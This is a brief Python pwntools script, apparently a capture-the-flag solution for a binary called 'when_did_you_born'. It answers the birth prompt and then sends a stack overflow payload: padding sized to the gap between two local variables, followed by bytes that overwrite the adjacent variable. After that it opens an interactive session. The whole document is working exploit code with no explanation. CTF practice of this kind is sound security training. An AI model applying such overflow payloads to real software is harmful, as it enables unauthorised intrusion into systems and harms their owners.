# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1

if Debug:
    io=process('./when_did_you_born')
else:
    pass

v4_addr=0x00007FFC60D33910
v5_addr=0x00007FFC60D33918
distance=v5_addr-v4_addr

def main():
    io.recvuntil("What's Your Birth?\n")
    io.sendline('1')
    io.recvuntil("What's Your Name?")
    io.sendline(distance*'a'+'\x86'+'\x07'+'\x00'*2)
    io.interactive()

main()